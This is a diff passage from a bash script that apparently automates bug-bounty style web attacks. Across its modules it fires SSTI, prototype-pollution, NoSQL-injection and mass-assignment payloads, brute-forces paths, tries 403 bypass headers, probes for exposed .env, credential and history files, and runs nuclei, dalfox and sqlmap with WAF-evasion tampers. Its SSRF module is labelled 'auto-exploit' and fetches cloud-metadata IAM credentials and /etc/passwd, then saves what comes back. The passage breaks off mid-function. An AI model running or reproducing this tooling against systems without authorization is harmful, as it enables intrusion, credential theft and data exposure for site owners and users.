+            local furl; furl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
+            local resp; resp=$(_curl "$furl" 2>/dev/null | head -c 3000 || true)
+            if echo "$resp" | grep -qP "\b49\b|\b7777777\b"; then
+                uniq_add "$O/ssti/ssti_confirmed.txt" "SSTI_CONFIRMED: $furl (payload: $payload)"
+                log_hit "SSTI CONFIRMED: $furl"
+            elif echo "$resp" | grep -qiE "(template|render|jinja|twig|freemarker|velocity|smarty|mako).*error"; then
+                uniq_add "$O/ssti/ssti_error.txt" "SSTI_ERROR_LEAK: $furl"
+            fi
+        done
+    done < <(head -150 "$PARAMS_IN" 2>/dev/null)
+    log_ok "SSTI confirmed: $(cnt "$O/ssti/ssti_confirmed.txt")"
+
+    # ── Type confusion probes ─────────────────────────
+    log_info "Type confusion / mass assignment probes..."
+    local -a TYPE_MUTATIONS=(
+        "0" "-1" "999999999" "null" "undefined" "true" "false"
+        "[]" "{}" "[]" "[null]" "NaN" "Infinity" "-Infinity"
+        "0.0" "1e308" "-1e308" "0x41" "0b1" "1.1.1"
+        "%00" "%0a" "%0d" "\x00" "\n" "\r\n"
+        "'OR 1=1--" "<script>" "{{7*7}}" "../etc/passwd"
+    )
+
+    while IFS= read -r url; do
+        for mut in "${TYPE_MUTATIONS[@]}"; do
+            local furl; furl=$(echo "$url" | qsreplace "$mut" 2>/dev/null || true)
+            local code; code=$(_curl -o /dev/null -w "%{http_code}" "$furl" 2>/dev/null || echo "000")
+            local body; body=$(_curl "$furl" 2>/dev/null | head -c 2000 || true)
+            if [[ "$code" == "500" ]] || echo "$body" | grep -qiE "(stack trace|unhandled exception|typeerror|valueerror|null pointer|undefined method|cannot read property|parse error|invalid.*type|expected.*number|expected.*string)"; then
+                uniq_add "$O/type_confusion/findings.txt" "TYPE_CONFUSION [${code}] (${mut}): $furl"
+            fi
+        done
+    done < <(head -80 "$PARAMS_IN" 2>/dev/null)
+    log_ok "Type confusion findings: $(cnt "$O/type_confusion/findings.txt")"
+
+    # ── Hidden parameter discovery (ParamMiner-style ffuf) ─
+    log_info "Hidden parameter discovery (ParamMiner-style ffuf)..."
+    local PARAM_WL="/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
+    [[ ! -f "$PARAM_WL" ]] && PARAM_WL="/usr/share/wordlists/dirb/common.txt"
+
+    while IFS= read -r url; do
+        local base_url="${url%%\?*}"
+        local s; s=$(safe_name "$url")
+        _ffuf -u "${base_url}?FUZZ=bugbounty_test" \
+            -w "$PARAM_WL" \
+            -t 50 \
+            -mc 200,201,302 \
+            -fs 0 \
+            -of json -o "$O/hidden_params/ffuf_get_${s}.json" \
+            -s 2>/dev/null || true
+        _ffuf -u "$base_url" \
+            -X POST \
+            -d "FUZZ=bugbounty_test" \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            -w "$PARAM_WL" \
+            -t 50 \
+            -mc 200,201,302 \
+            -fs 0 \
+            -of json -o "$O/hidden_params/ffuf_post_${s}.json" \
+            -s 2>/dev/null || true
+    done < <(head -30 "$WORKSPACE/subdomains/status_200.txt" 2>/dev/null)
+
+    find "$O/hidden_params" -name "*.json" -size +10c 2>/dev/null \
+        | xargs -I{} jq -r '.results[]?.input.FUZZ' {} 2>/dev/null \
+        | sort -u > "$O/hidden_params/discovered_params.txt" || true
+    log_ok "Hidden params discovered: $(cnt "$O/hidden_params/discovered_params.txt")"
+
+    # ── JSON / XML mutation ───────────────────────────
+    log_info "JSON/XML body mutation on API endpoints..."
+    local API_URLS="$WORKSPACE/urls/urls_dynamic.txt"
+    [[ ! -s "$API_URLS" ]] && API_URLS="$WORKSPACE/urls/urls_with_params.txt"
+
+    local -a JSON_PAYLOADS=(
+        '{"__proto__":{"admin":true}}'
+        '{"constructor":{"prototype":{"admin":true}}}'
+        '{"$where":"sleep(1000)"}'
+        '{"$gt":"","$ne":""}'
+        '{"id":{"$gt":0}}'
+        '{"role":"admin","is_admin":true,"privilege":9999}'
+        '{"a":"b","c":"d","e":"f","g":"h","i":"j","k":"l","m":"n","o":"p","q":"r","s":"t","u":"v","w":"x","y":"z","aa":"bb","cc":"dd","ee":"ff","gg":"hh","ii":"jj","kk":"ll","mm":"nn"}'
+    )
+    local -a JSON_LABELS=("prototype_pollution" "constructor_pollution" "nosqli_where" "nosqli_ne" "nosqli_gt" "mass_assign" "large_payload")
+
+    while IFS= read -r url; do
+        for i in "${!JSON_PAYLOADS[@]}"; do
+            local payload="${JSON_PAYLOADS[$i]}"
+            local label="${JSON_LABELS[$i]}"
+            local resp_code body
+            resp_code=$(_curl -X POST -H "Content-Type: application/json" \
+                -d "$payload" -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
+            body=$(_curl -X POST -H "Content-Type: application/json" \
+                -d "$payload" "$url" 2>/dev/null | head -c 2000 || true)
+            if [[ "$resp_code" =~ ^(200|201)$ ]] || \
+               echo "$body" | grep -qiE "(admin|true|success|token|privilege|elevated|granted)"; then
+                uniq_add "$O/json_xml/json_hits.txt" "JSON_MUTATION [${label}] [${resp_code}]: $url"
+                log_warn "JSON mutation hit [$label]: $url"
+            fi
+            if [[ "$resp_code" =~ ^(200|201)$ ]] || \
+               echo "$body" | grep -qiE "(admin|true|success|token|privilege|elevated|granted)"; then
+                uniq_add "$O/json_xml/json_hits.txt" "JSON_MUTATION [${label}] [${resp_code}]: $url"
+                log_warn "JSON mutation hit [$label]: $url"
+            fi
+            if echo "$body" | grep -qiE "(error|exception|stack|trace|syntax)" && [[ "$resp_code" == "500" ]]; then
+                uniq_add "$O/json_xml/json_500.txt" "JSON_500 [${label}] [${resp_code}]: $url"
+            fi
+        done
+    done < <(head -50 "$API_URLS" 2>/dev/null)
+    sort -u -o "$O/json_xml/json_hits.txt" "$O/json_xml/json_hits.txt" 2>/dev/null || true
+    sort -u -o "$O/json_xml/json_500.txt" "$O/json_xml/json_500.txt" 2>/dev/null || true
+    log_ok "JSON mutation hits: $(cnt "$O/json_xml/json_hits.txt")"
+    log_ok "Parameter mutation fuzzing complete → $O/"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 05 — PATH & ENDPOINT DISCOVERY
+# ══════════════════════════════════════════════════════
+mod_paths() {
+    progress "MODULE 05 — Path & Endpoint Discovery"
+    log_section "MODULE 05 — PATH & ENDPOINT DISCOVERY"
+    local O="$WORKSPACE/paths"
+    local EP="$WORKSPACE/endpoints"
+    mkdir -p "$EP"
+
+    local WL_COMMON="/usr/share/wordlists/dirb/common.txt"
+    local WL_RAFT="/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt"
+    local WL_API="/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt"
+    local WL_MED="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+    local WL_FILES="/usr/share/seclists/Discovery/Web-Content/raft-small-files.txt"
+    [[ -n "$CUSTOM_WL" && -f "$CUSTOM_WL" ]] && WL_RAFT="$CUSTOM_WL"
+    [[ ! -f "$WL_RAFT"  ]] && WL_RAFT="$WL_COMMON"
+    [[ ! -f "$WL_API"   ]] && WL_API="$WL_COMMON"
+    [[ ! -f "$WL_MED"   ]] && WL_MED="$WL_COMMON"
+    [[ ! -f "$WL_FILES" ]] && WL_FILES="$WL_COMMON"
+
+    local MAIN="https://$DOMAIN"
+
+    log_info "ffuf directory bruteforce (top 20 hosts, threads: $T_FFUF)..."
+    head -20 "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null | while IFS= read -r target; do
+        local s; s=$(safe_name "$target")
+        _ffuf -u "${target}/FUZZ" \
+            -w "$WL_RAFT" \
+            -t "$T_FFUF" \
+            -mc 200,201,204,301,302,307,401,403,405,500 \
+            -of json -o "$O/ffuf_${s}.json" \
+            -s 2>/dev/null || true
+    done
+    log_ok "ffuf complete"
+
+    log_info "feroxbuster recursive scan (depth 4)..."
+    _ffuf -u "${MAIN}/FUZZ" -w "$WL_MED" -t "$T_FFUF" \
+        -mc 200,204,301,302,307,401,403,405 \
+        -of json -o "$O/ferox_main.json" -s 2>/dev/null \
+        || feroxbuster --url "$MAIN" \
+            --wordlist "$WL_MED" \
+            --threads 50 --depth 4 \
+            --status-codes 200,204,301,302,307,401,403,405 \
+            --auto-tune --collect-backups \
+            --collect-extensions js,php,asp,aspx,jsp,json,yaml,yml,env,bak,old,txt,xml,conf \
+            --output "$O/feroxbuster_main.txt" \
+            --quiet 2>/dev/null || true
+    log_ok "feroxbuster complete"
+
+    log_info "API endpoint discovery..."
+    _ffuf -u "${MAIN}/FUZZ" -w "$WL_API" -t "$T_FFUF" \
+        -mc 200,201,204,301,302,401,403,405 \
+        -of json -o "$O/ffuf_api.json" -s 2>/dev/null || true
+
+    log_info "Backup & sensitive file check..."
+    _ffuf -u "${MAIN}/FUZZ" -w "$WL_FILES" -t "$T_FFUF" \
+        -mc 200,301,302 \
+        -of json -o "$O/ffuf_backups.json" -s 2>/dev/null || true
+
+    cat "$O/ffuf_"*.json 2>/dev/null \
+        | jq -r '.results[]?.url' 2>/dev/null \
+        | sort -u > "$EP/ffuf_found.txt" || true
+    grep -oE 'https?://[^ ]+' "$O/feroxbuster_main.txt" 2>/dev/null \
+        | sort -u > "$EP/feroxbuster_found.txt" || true
+
+    # ── 403 Bypass ────────────────────────────────────────
+    log_info "403 bypass (16 path + header techniques)..."
+    local bypass_out="$O/403_bypass.txt"
+    while IFS= read -r url; do
+        local path base
+        path=$(echo "$url" | grep -oP "(?<=${DOMAIN}).*" || true)
+        base=$(echo "$url" | grep -oP 'https?://[^/]+' || true)
+        [[ -z "$path" || -z "$base" ]] && continue
+
+        for trick in \
+            "${path}%2e" "/${path}" "//${path}" "${path}/." \
+            "${path}/.." "/%2f${path}" "${path}%20" "${path}%09" \
+            "/.${path}" "${path}..;/" "/${path}?x" \
+            "${path}/./" "/${path}%3f" "${path}#" "/%2e${path}"; do
+            local c; c=$(_curl -o /dev/null -w "%{http_code}" "${base}${trick}" 2>/dev/null || echo "000")
+            [[ "$c" == "200" ]] && uniq_add "$bypass_out" "PATH_BYPASS [$c]: ${base}${trick}"
+        done
+
+        for hdr in \
+            "X-Original-URL: $path" \
+            "X-Rewrite-URL: $path" \
+            "X-Override-URL: $path" \
+            "X-Forwarded-For: 127.0.0.1" \
+            "X-Real-IP: 127.0.0.1" \
+            "X-Custom-IP-Authorization: 127.0.0.1" \
+            "CF-Connecting-IP: 127.0.0.1" \
+            "X-Host: localhost" \
+            "Referer: ${base}${path}" \
+            "X-Forwarded-Host: localhost"; do
+            local c; c=$(_curl -o /dev/null -w "%{http_code}" -H "$hdr" "$url" 2>/dev/null || echo "000")
+            [[ "$c" == "200" ]] && uniq_add "$bypass_out" "HEADER_BYPASS [$c] ($hdr): $url"
+        done
+    done < "$WORKSPACE/paths/403_targets.txt" 2>/dev/null
+    sort -u -o "$bypass_out" "$bypass_out" 2>/dev/null || true
+    [[ -s "$bypass_out" ]] && log_hit "403 BYPASSES: $(cnt "$bypass_out") found!"
+
+    log_info "Arjun hidden parameter discovery (top 50 endpoints)..."
+    head -50 "$WORKSPACE/subdomains/status_200.txt" 2>/dev/null | while IFS= read -r url; do
+        local s; s=$(safe_name "$url")
+        arjun -u "$url" -oJ "$WORKSPACE/params/arjun_${s}.json" -t 20 -q 2>/dev/null || true
+    done
+    cat "$WORKSPACE/params/arjun_"*.json 2>/dev/null \
+        | jq -r '.params[]?' 2>/dev/null | sort -u \
+        >> "$WORKSPACE/params/all_params.txt" || true
+    sort -u -o "$WORKSPACE/params/all_params.txt" "$WORKSPACE/params/all_params.txt" 2>/dev/null || true
+
+    cat "$EP/ffuf_found.txt" "$EP/feroxbuster_found.txt" \
+        "$WORKSPACE/js/all_js_endpoints.txt" \
+        "$WORKSPACE/urls/katana.txt" 2>/dev/null | sort -u > "$EP/all_endpoints.txt"
+    log_ok "Total discovered endpoints: $(cnt "$EP/all_endpoints.txt")"
+
+    grep -iE "(admin|api/v[0-9]|graphql|swagger|actuator|debug|backup|config|secret|key|token|login|auth|dashboard|panel|manage|internal|dev|test|staging|upload|download|export|import|reset|forgot|webhook|payment|oauth|oidc|saml|sso|\.env|\.git|phpinfo|server-status|metrics|prometheus)" \
+        "$EP/all_endpoints.txt" 2>/dev/null | sort -u > "$EP/interesting_paths.txt"
+    log_ok "Interesting paths flagged: $(cnt "$EP/interesting_paths.txt")"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 06 — PORT SCAN
+# ══════════════════════════════════════════════════════
+mod_ports() {
+    [[ "$F_QUICK" == true ]] && return
+    progress "MODULE 06 — Port Scan"
+    log_section "MODULE 06 — NMAP PORT SCAN"
+    local O="$WORKSPACE/subdomains"
+
+    [[ ! -s "$O/resolved_domains.txt" ]] && { log_warn "No resolved hosts for port scan"; return; }
+    log_info "nmap top-1000 on $(cnt "$O/resolved_domains.txt") hosts..."
+    nmap -iL "$O/resolved_domains.txt" \
+        --top-ports 1000 -T4 --open \
+        -sV --version-intensity 3 \
+        -oN "$O/nmap_scan.txt" \
+        -oG "$O/nmap_grep.txt" 2>/dev/null || true
+    log_ok "nmap complete → $O/nmap_scan.txt"
+
+    grep "open" "$O/nmap_grep.txt" 2>/dev/null \
+        | grep -E "(21|22|23|25|110|143|161|389|445|3306|5432|5900|6379|8080|8443|9200|11211|27017)" \
+        | sort -u > "$O/interesting_ports.txt" || true
+    [[ -s "$O/interesting_ports.txt" ]] && log_warn "Interesting ports: $(cnt "$O/interesting_ports.txt") (review $O/interesting_ports.txt)"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 07 — SENSITIVE FILE EXPOSURE
+# ══════════════════════════════════════════════════════
+mod_exposure() {
+    progress "MODULE 07 — Sensitive File Exposure"
+    log_section "MODULE 07 — SENSITIVE FILE & EXPOSURE CHECK"
+    local O="$WORKSPACE/vulns/misconfig"
+
+    local -a PATHS=(
+        "/.env" "/.env.local" "/.env.production" "/.env.staging" "/.env.bak"
+        "/.git/config" "/.git/HEAD" "/.git/COMMIT_EDITMSG"
+        "/config.php" "/config.yml" "/config.yaml" "/config.json"
+        "/wp-config.php" "/wp-config.php.bak"
+        "/database.yml" "/database.json" "/db.json"
+        "/docker-compose.yml" "/.dockerenv" "/Dockerfile"
+        "/package.json" "/package-lock.json" "/yarn.lock"
+        "/composer.json" "/composer.lock"
+        "/phpinfo.php" "/info.php" "/test.php"
+        "/server-status" "/server-info" "/.htpasswd" "/.htaccess"
+        "/actuator" "/actuator/env" "/actuator/beans" "/actuator/heapdump"
+        "/actuator/mappings" "/actuator/logfile"
+        "/metrics" "/health" "/status" "/debug" "/trace"
+        "/api/swagger.json" "/swagger.json" "/api-docs"
+        "/swagger-ui.html" "/swagger-ui/" "/redoc" "/openapi.json"
+        "/.DS_Store" "/thumbs.db"
+        "/backup.sql" "/dump.sql" "/database.sql" "/backup.zip"
+        "/crossdomain.xml" "/clientaccesspolicy.xml"
+        "/robots.txt" "/sitemap.xml" "/security.txt" "/.well-known/security.txt"
+        "/.aws/credentials" "/credentials.json"
+        "/.bash_history" "/web.config"
+    )
+
+    log_info "Checking ${#PATHS[@]} sensitive paths on top 15 live hosts..."
+    while IFS= read -r base; do
+        for path in "${PATHS[@]}"; do
+            local url="${base}${path}"
+            local code; code=$(_curl -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
+            if [[ "$code" == "200" ]]; then
+                local sz; sz=$(_curl -o /dev/null -w "%{size_download}" "$url" 2>/dev/null || echo "0")
+                if [[ "$sz" -gt 10 ]] 2>/dev/null; then
+                    uniq_add "$O/sensitive_files.txt" "EXPOSED [$code] [${sz}b]: $url"
+                    log_hit "EXPOSED: $url (${sz} bytes)"
+                fi
+            fi
+        done
+    done < <(head -15 "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null)
+    sort -u -o "$O/sensitive_files.txt" "$O/sensitive_files.txt" 2>/dev/null || true
+
+    [[ -s "$O/sensitive_files.txt" ]] && \
+        log_hit "SENSITIVE FILES: $(cnt "$O/sensitive_files.txt") exposed!"
+    log_ok "Exposure check complete"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 08 — NUCLEI
+# ══════════════════════════════════════════════════════
+mod_nuclei() {
+    progress "MODULE 08 — Nuclei Vulnerability Scan"
+    log_section "MODULE 08 — NUCLEI AUTOMATED VULNERABILITY SCAN"
+    local O="$WORKSPACE/vulns/nuclei"
+    local LIVE="$WORKSPACE/subdomains/live_urls.txt"
+    local PARAMS="$WORKSPACE/urls/urls_with_params.txt"
+
+    mkdir -p "$O" 2>/dev/null || true
+    touch "$O/nuclei_full.txt" "$O/nuclei_full.json" "$O/nuclei_critical_high.txt" \
+          "$O/nuclei_params.txt" "$O/nuclei_cves.txt" "$O/nuclei_misconfig.txt" \
+          "$O/nuclei_takeover.txt" 2>/dev/null || true
+    log_info "Updating nuclei templates..."
+    nuclei -update-templates -silent 2>/dev/null || true
+
+    log_info "Nuclei FULL scan (threads: $T_NUCLEI, rate: $R_NUCLEI/s)..."
+    _nuclei -list "$LIVE" \
+        -t "$HOME/nuclei-templates" \
+        -severity critical,high,medium,low,info \
+        -tags "cve,rce,sqli,xss,lfi,ssrf,idor,auth,misconfig,exposure,token,default-login,panel,backup,debug,takeover" \
+        -c "$T_NUCLEI" -rate-limit "$R_NUCLEI" \
+        -timeout "$TIMEOUT_CONN" -retries 2 \
+        -follow-redirects -stats \
+        -json-export "$O/nuclei_full.json" \
+        -o "$O/nuclei_full.txt" 2>/dev/null || true
+    sort -u -o "$O/nuclei_full.txt" "$O/nuclei_full.txt" 2>/dev/null || true
+    log_ok "Nuclei full: $(cnt "$O/nuclei_full.txt") findings"
+
+    jq -r 'select(.info.severity=="critical" or .info.severity=="high")
+        | "[\(.info.severity|ascii_upcase)] [\(.info.name)] \(.host)"' \
+        "$O/nuclei_full.json" 2>/dev/null | sort -u > "$O/nuclei_critical_high.txt" || true
+    [[ -s "$O/nuclei_critical_high.txt" ]] && \
+        log_hit "NUCLEI Critical/High: $(cnt "$O/nuclei_critical_high.txt") findings!"
+
+    log_info "Nuclei DAST on parameterized URLs..."
+    _nuclei -list "$PARAMS" \
+        -t "$HOME/nuclei-templates/dast" \
+        -t "$HOME/nuclei-templates/vulnerabilities" \
+        -c 30 -rate-limit 100 \
+        -json-export "$O/nuclei_params.json" \
+        -o "$O/nuclei_params.txt" -silent 2>/dev/null || true
+    sort -u -o "$O/nuclei_params.txt" "$O/nuclei_params.txt" 2>/dev/null || true
+
+    log_info "CVE-targeted scan..."
+    _nuclei -list "$LIVE" -tags cve \
+        -c "$T_NUCLEI" -rate-limit 100 \
+        -json-export "$O/nuclei_cves.json" \
+        -o "$O/nuclei_cves.txt" -silent 2>/dev/null || true
+    sort -u -o "$O/nuclei_cves.txt" "$O/nuclei_cves.txt" 2>/dev/null || true
+    log_ok "CVE findings: $(cnt "$O/nuclei_cves.txt")"
+
+    log_info "Misconfiguration scan..."
+    _nuclei -list "$LIVE" \
+        -tags "misconfig,exposure,panel,default-login,backup,debug,config" \
+        -c "$T_NUCLEI" -o "$O/nuclei_misconfig.txt" -silent 2>/dev/null || true
+    sort -u -o "$O/nuclei_misconfig.txt" "$O/nuclei_misconfig.txt" 2>/dev/null || true
+    log_ok "Misconfig findings: $(cnt "$O/nuclei_misconfig.txt")"
+
+    log_info "Takeover check..."
+    _nuclei -list "$LIVE" -tags takeover \
+        -o "$O/nuclei_takeover.txt" -silent 2>/dev/null || true
+    sort -u -o "$O/nuclei_takeover.txt" "$O/nuclei_takeover.txt" 2>/dev/null || true
+    [[ -s "$O/nuclei_takeover.txt" ]] && \
+        log_hit "Subdomain takeovers: $(cnt "$O/nuclei_takeover.txt")"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 09 — XSS
+# ══════════════════════════════════════════════════════
+mod_xss() {
+    [[ "$F_NO_EXPLOIT" == true ]] && return
+    progress "MODULE 09 — XSS Detection"
+    log_section "MODULE 09 — XSS (dalfox)"
+    local O="$WORKSPACE/vulns/xss"
+
+    mkdir -p "$O" 2>/dev/null || true
+    touch "$O/dalfox_results.txt" "$O/no_csp.txt" "$O/csp_present.txt" 2>/dev/null || true
+    local XSS_IN="$WORKSPACE/urls/gf/xss.txt"
+    [[ ! -s "$XSS_IN" ]] && XSS_IN="$WORKSPACE/urls/urls_with_params.txt"
+
+    # Live-filter first — no WAF-blocked/junk targets reach dalfox
+    active_filter "$XSS_IN" /tmp/dalfox_input_$$.txt 300
+    local dalfox_count; dalfox_count=$(wc -l < /tmp/dalfox_input_$$.txt 2>/dev/null || echo 0)
+    [[ "$dalfox_count" -gt 500 ]] && head -500 /tmp/dalfox_input_$$.txt > /tmp/dalfox_cap_$$.txt \
+        && mv /tmp/dalfox_cap_$$.txt /tmp/dalfox_input_$$.txt
+    log_info "dalfox (workers: $T_DALFOX, urls: $dalfox_count, timeout: 300s total)..."
+    timeout 300 dalfox file "/tmp/dalfox_input_$$.txt" \
+        --silence --skip-bav --no-color \
+        --worker "$T_DALFOX" \
+        --timeout 5 \
+        --delay 0 \
+        --only-discovery \
+        ${SESSION_COOKIE:+--cookie "$SESSION_COOKIE"} \
+        ${PROXY_URL:+--proxy "$PROXY_URL"} \
+        --output "$O/dalfox_results.txt" \
+        --format json 2>/dev/null || true
+    rm -f /tmp/dalfox_input_$$.txt
+    sort -u -o "$O/dalfox_results.txt" "$O/dalfox_results.txt" 2>/dev/null || true
+    [[ -s "$O/dalfox_results.txt" ]] && log_hit "XSS: $(cnt "$O/dalfox_results.txt") hits!"
+
+    log_info "CSP header check on live hosts..."
+    while IFS= read -r url; do
+        local csp; csp=$(_curl -I "$url" 2>/dev/null | grep -i "content-security-policy" | head -1)
+        if [[ -z "$csp" ]]; then
+            uniq_add "$O/no_csp.txt" "NO_CSP: $url"
+        else
+            uniq_add "$O/csp_present.txt" "$url | $csp"
+        fi
+    done < "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null || true
+    log_ok "No CSP: $(cnt "$O/no_csp.txt") hosts"
+    log_ok "XSS scan complete"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 10 — SQLi
+# ══════════════════════════════════════════════════════
+mod_sqli() {
+    [[ "$F_NO_EXPLOIT" == true ]] && return
+    progress "MODULE 10 — SQLi Detection"
+    log_section "MODULE 10 — SQL INJECTION (sqlmap)"
+    local O="$WORKSPACE/vulns/sqli"
+    mkdir -p "$O/sqlmap_active" 2>/dev/null || true
+    local SQLI_IN="$WORKSPACE/urls/gf/sqli.txt"
+    local PARAM_IN="$WORKSPACE/urls/urls_with_params.txt"
+
+    log_info "SQLi: live-checking URLs to find active targets..."
+    active_filter "$SQLI_IN"  "/tmp/sqli_gf_$$.txt"  30
+    active_filter "$PARAM_IN" "/tmp/sqli_par_$$.txt" 20
+    cat /tmp/sqli_gf_$$.txt /tmp/sqli_par_$$.txt 2>/dev/null | sort -u > /tmp/sqli_final_$$.txt
+    local sqli_count; sqli_count=$(wc -l < /tmp/sqli_final_$$.txt 2>/dev/null || echo 0)
+
+    if [[ "$sqli_count" -eq 0 ]]; then
+        log_warn "No active SQLi targets found — skipping sqlmap"
+        rm -f /tmp/sqli_gf_$$.txt /tmp/sqli_par_$$.txt /tmp/sqli_final_$$.txt
+        return
     fi
-  done
-  head -10 "$W/subs/live.txt" | while IFS= read -r base; do
-    for p in "admin" "admin/" "api/admin" "internal" "staff" "manage"; do
-      local a1 a2; a1=$(curlx -o /dev/null -w '%{http_code}' -- "${base%/}/${p}" 2>/dev/null || echo 000)
-      a2=$(curlx -o /dev/null -w '%{http_code}' -H "X-Forwarded-For: 127.0.0.1" -H "X-Original-URL: /${p}" -- "${base%/}/${p}" 2>/dev/null || echo 000)
-      if [[ "$a2" =~ ^(200|302)$ && ! "$a1" =~ ^(200|302)$ ]]; then
-        echo "HIGH|BAC-BYPASS|$base/$p (403→${a2})" >> "$O/bac.txt"
-        qadd high bac "${base%/}/${p}"
-        log H "BAC bypass via header: ${base%/}/${p} → ${a2}"
-      fi
+
+    log_info "sqlmap on $sqli_count active URLs (timeout: 600s, fully automated)..."
+    timeout 600 sqlmap \
+        -m "/tmp/sqli_final_$$.txt" \
+        --batch \
+        --level=2 --risk=1 \
+        --random-agent \
+        --threads=5 \
+        --timeout=10 \
+        --retries=1 \
+        --tamper=space2comment,between,randomcase \
+        --no-cast \
+        --smart \
+        --skip=User-Agent,Referer,Host \
+        --ignore-code=403 \
+        --answers="follow=N,sitemap=N,reduce=Y,store=N,normalize=Y,proceed=C,test=Y,try=Y,cookie=N,redirect=N,integer=Y" \
+        ${SESSION_COOKIE:+--cookie="$SESSION_COOKIE"} \
+        ${PROXY_URL:+--proxy="$PROXY_URL"} \
+        --output-dir="$O/sqlmap_active" 2>/dev/null || true
+
+    rm -f /tmp/sqli_gf_$$.txt /tmp/sqli_par_$$.txt /tmp/sqli_final_$$.txt
+
+    find "$O" -name "*.csv" -size +0c 2>/dev/null | while IFS= read -r f; do
+        grep -v "^Target" "$f" | grep -v "^$" | while IFS= read -r line; do
+            uniq_add "$O/sqli_findings.txt" "SQLi: $line"
+            log_hit "SQLi: $line"
+        done
     done
-  done
-  u "$O/idor.txt" "$O/bac.txt"
-  log OK "idor candidates: $(cnt "$O/idor.txt") | bac: $(cnt "$O/bac.txt")"
+    log_ok "SQLi scan complete → $O/"
+}
+# ══════════════════════════════════════════════════════
+# MODULE 11 — SSRF  (detect + auto-exploit metadata/file/localhost)
+# ══════════════════════════════════════════════════════
+mod_ssrf() {
+    [[ "$F_NO_EXPLOIT" == true ]] && return
+    progress "MODULE 11 — SSRF"
+    log_section "MODULE 11 — SSRF DETECTION + AUTO-EXPLOIT"
+    local O="$WORKSPACE/vulns/ssrf"
+    mkdir -p "$O/meta" 2>/dev/null || true
+    local SSRF_IN="$WORKSPACE/urls/gf/ssrf.txt"
+    [[ ! -s "$SSRF_IN" ]] && SSRF_IN="$WORKSPACE/urls/urls_with_params.txt"
+    [[ ! -s "$SSRF_IN" ]] && SSRF_IN="$WORKSPACE/urls/urls_dynamic.txt"
+
+    active_filter "$SSRF_IN" /tmp/ssrf_in_$$.txt 60
+    local ssrf_total; ssrf_total=$(wc -l < /tmp/ssrf_in_$$.txt 2>/dev/null || echo 0)
+    log_info "SSRF: testing $ssrf_total live URLs (in-band + OOB + time-based)"
+
+    # ── Internal IP / metadata payloads ────────────────
+    local -a SSRF_HOSTS=(
+        "127.0.0.1" "localhost" "0.0.0.0" "::1" "[::1]"
+        "2130706433" "0x7f000001" "0177.0.0.1" "127.1" "017700000001"
+        "169.254.169.254" "0xA9FEA9FE" "2852039166"
+        "10.0.0.1" "10.255.255.1" "172.16.0.1" "192.168.1.1"
+    )
+    local -a SSRF_PATHS=(
+        "/latest/meta-data/" "/latest/meta-data/iam/security-credentials/"
+        "/latest/meta-data/iam/security-credentials/admin"
+        "/latest/user-data/" "/latest/dynamic/instance-identity/document"
+        "/" "/robots.txt" "/server-status"
+    )
+
+    while IFS= read -r url; do
+        local base="${url%%\?*}"
+        # baseline
+        local t0; t0=$(date +%s%N)
+        local base_body; base_body=$(_curl "$url" 2>/dev/null | head -c 1500 || true)
+        local t1; t1=$(date +%s%N)
+        local base_ms=$(( (t1 - t0) / 1000000 ))
+        local base_hash; base_hash=$(echo "$base_body" | md5sum | cut -d' ' -f1)
+
+        for host in "${SSRF_HOSTS[@]}"; do
+            for path in "${SSRF_PATHS[@]}"; do
+                local payload="http://${host}${path}"
+                local furl; furl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
+                [[ "$furl" == "$url" ]] && continue
+                local body code sz
+                body=$(_curl "$furl" 2>/dev/null | head -c 3000 || true)
+                code=$(_curl -o /dev/null -w "%{http_code}" "$furl" 2>/dev/null || echo "000")
+                sz=${#body}
+
+                # in-band: metadata / internal content
+                if echo "$body" | grep -qiE "(ami-id|instance-id|meta-data|security-credentials|AccessKeyId|SecretAccessKey|Token|accountId|availabilityZone)"; then
+                    uniq_add "$O/ssrf_confirmed.txt" "SSRF_METADATA [${code}]: $furl"
+                    log_hit "SSRF → CLOUD METADATA: $furl"
+                    echo "$body" > "$O/meta/$(safe_name "$furl").body"
+                    continue
+                fi
+                if echo "$body" | grep -qiE "(root:x:0:0|/bin/bash|uid=|/etc/passwd)"; then
+                    uniq_add "$O/ssrf_confirmed.txt" "SSRF_FILE [${code}]: $furl"
+                    log_hit "SSRF → FILE READ: $furl"
+                    echo "$body" > "$O/meta/$(safe_name "$furl").body"
+                    continue
+                fi
+                # error oracle: internal port/service behavior
+                if echo "$body" | grep -qiE "(connection refused|no route to host|failed to connect|name or service not known|timed out|tcp|socket)"; then
+                    uniq_add "$O/ssrf_error_oracle.txt" "SSRF_ORACLE [${code}] (${host}${path}): $furl"
+                fi
+                # divergence heuristic
+                if [[ "$code" =~ ^(200|301|302)$ ]] && [[ "$sz" -gt 0 ]] && \
+                   [[ "$(echo "$body" | md5sum | cut -d' ' -f1)" != "$base_hash" ]]; then
+                    uniq_add "$O/ssrf_divergence.txt" "SSRF_DIVERGENCE [${code}] [${sz}b] (${host}${path}): $furl"
+                fi
+            done
+        done
+
+        # ── time-based probe: unroutable internal → delay ──
+        local slow_furl; slow_furl=$(echo "$url" | qsreplace "http://10.255.255.1:81/" 2>/dev/null || true)
+        local t2; t2=$(date +%s%N)
+        _curl --connect-timeout 8 --max-time 12 "$slow_furl" >/dev/null 2>&1 || true
+        local t3; t3=$(date +%s%N)
+        local slow_ms=$(( (t3 - t2) / 1000000 ))
+        if [[ "$slow_ms" -gt $(( base_ms + 3000 )) ]] && [[ "$slow_ms" -gt 4000 ]]; then
+            uniq_add "$O/ssrf_timebased.txt" "SSRF_TIMEBASED [${slow_ms}ms vs base ${base_ms}ms]: $furl"
